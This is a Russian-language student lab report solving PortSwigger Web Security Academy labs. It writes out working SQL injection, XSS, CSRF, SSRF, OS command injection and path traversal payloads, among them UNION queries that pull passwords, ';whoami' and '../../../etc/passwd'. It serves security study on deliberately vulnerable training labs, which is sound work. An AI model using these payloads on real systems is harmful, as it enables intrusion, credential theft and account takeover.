# Практическая работа №3 (Web). Основные атаки и паттерны (PortSwigger)

## Цель работы
Изучить основные атаки на WEB.

## Задание
На стенде https://portswigger.net/web-security разобрать перечисленные лаборатории по
темам: SQL-injection, XSS, CSRF, SSRF, RCE (OS command injection), Path traversal.

> Все лаборатории PortSwigger Web Security Academy — это специально уязвимые учебные
> стенды, созданные для тренировки. Решения ниже выполняются **только** на них.
> 📷 СКРИНШОТ: для каждой лабы снимайте баннер «Congratulations, you solved the lab».

---

## SQL-injection

### Lab: SQL injection vulnerability allowing login bypass
Цель — войти под `administrator`, не зная пароля.
В форме входа в поле **username** ввести:
```
administrator'--
```
пароль — любой. Комментарий `--` отсекает проверку пароля в SQL-запросе
(`...WHERE username='administrator'--' AND password='...'`).

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Исходный URL фильтра категории:
```
https://ЛАБА/filter?category=Gifts
```
Изменить параметр так, чтобы показать скрытые (неопубликованные) товары:
```
?category=Gifts'--
```
или вытащить всё:
```
?category=Gifts'+OR+1=1--
```
Условие `OR 1=1` всегда истинно → выводятся все товары, включая released=0.

### Lab: SQL injection UNION attack, retrieving data from other tables
1. Определить число столбцов:
   ```
   ?category=Gifts'+UNION+SELECT+NULL,NULL--
   ```
   (подбирать количество NULL, пока нет ошибки — здесь 2).
2. Найти текстовый столбец и вытащить логины/пароли из таблицы `users`:
   ```
   ?category=Gifts'+UNION+SELECT+username,+password+FROM+users--
   ```
3. Войти под `administrator` с полученным паролем.

### Lab: SQL injection — querying the database version (MySQL/Microsoft)
Определить версию СУБД через UNION:
```
?category=Gifts'+UNION+SELECT+@@version,+NULL--
```
(`@@version` — для MySQL/MSSQL; для Oracle — `SELECT banner FROM v$version`).
📷 СКРИНШОТ версии в ответе.

---

## XSS (Cross-Site Scripting)

### Lab: Stored XSS into HTML context with nothing encoded
В поле комментария к посту ввести полезную нагрузку:
```html
<script>alert(1)</script>
```
После сохранения при открытии поста скрипт выполнится (stored XSS).

### Lab: DOM XSS in document.write sink using source location.search
Уязвим параметр поиска, попадающий в `document.write`. Ввести в поиск:
```
"><svg onload=alert(1)>
```
(нагрузка закрывает атрибут и внедряет событие).

### Lab: Reflected XSS into a JavaScript string with angle brackets HTML-encoded
Угловые скобки закодированы, поэтому выходим из строки JS:
```
'-alert(1)-'
```
Нагрузка попадает внутрь JS-строки и выполняется.

### Lab: DOM XSS in document.write sink using location.search inside a select element
Нагрузка ломает элемент `select` и внедряет скрипт:
```
"></select><img src=x onerror=alert(1)>
```
(вариант «lab-dom-xss-reflected» — рефлексия в JS-sink, нагрузка `"><svg onload=alert(1)>`).
📷 СКРИНШОТ сработавшего alert.

---

## CSRF (Cross-Site Request Forgery)

### Lab: CSRF vulnerability with no defenses
Форма смены email не защищена токеном. Создать на эксплойт-сервере страницу:
```html
<form action="https://ЛАБА/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="hacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```
Нажать **Deliver to victim** — email жертвы меняется.

### Lab: CSRF where token validation depends on request method
Токен проверяется только для POST. Меняем метод на GET и убираем токен:
```html
<img src="https://ЛАБА/my-account/change-email?email=hacker@evil.com">
```
или форма method="GET". Доставить жертве.
📷 СКРИНШОТ смены email.

---

## SSRF (Server-Side Request Forgery)

### Lab: Basic SSRF against the local server
В функции проверки наличия товара (stockApi) подменить URL на внутренний:
```
stockApi=http://localhost/admin
```
Затем удалить пользователя:
```
stockApi=http://localhost/admin/delete?username=carlos
```

### Lab: SSRF with filter bypass via open redirection
Приложение фильтрует localhost, но есть open redirect в `/product/nextProduct`.
Используем его для обхода:
```
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos
```
📷 СКРИНШОТ удаления carlos.

---

## RCE (OS command injection)

### Lab: OS command injection, simple case
В функции проверки наличия (productId/storeId) внедрить команду через `;`:
```
productId=1&storeId=1;whoami
```
В ответе появится имя пользователя ОС (результат `whoami`).
📷 СКРИНШОТ вывода команды.

---

## Path Traversal

### Lab: File path traversal, simple case
Изображение грузится по параметру `filename`. Выйти из каталога к системному файлу:
```
GET /image?filename=../../../etc/passwd
```
В ответе — содержимое `/etc/passwd`.

### Lab: File path traversal, traversal sequences blocked with absolute path bypass
Относительный путь блокируется — использовать абсолютный:
```
GET /image?filename=/etc/passwd
```
📷 СКРИНШОТ содержимого /etc/passwd.

---

## Контрольные вопросы
- **Что такое SQL-инъекция?** — внедрение SQL-кода через пользовательский ввод для изменения запроса к БД.
- **Чем stored XSS опаснее reflected?** — сохранённый скрипт выполняется у каждого, кто открывает страницу.
- **Как работает CSRF?** — браузер жертвы шлёт запрос с её куками на действие, которое она не инициировала.
- **В чём суть SSRF?** — заставить сервер сделать запрос к внутреннему ресурсу от своего имени.
- **Что такое OS command injection (RCE)?** — внедрение команд ОС через ввод, приводящее к выполнению кода на сервере.
- **Как защититься от path traversal?** — валидация имени файла, запрет `../`, канонизация пути.

## Вывод
На учебных стендах PortSwigger разобраны основные классы веб-уязвимостей: SQL-инъекции
(обход входа, UNION-атаки, определение версии СУБД), XSS (stored, reflected, DOM), CSRF
(без защиты и обход проверки токена по методу), SSRF (к localhost и обход фильтра),
OS command injection (RCE) и path traversal. Для каждой уязвимости показаны вектор атаки
и принцип защиты.
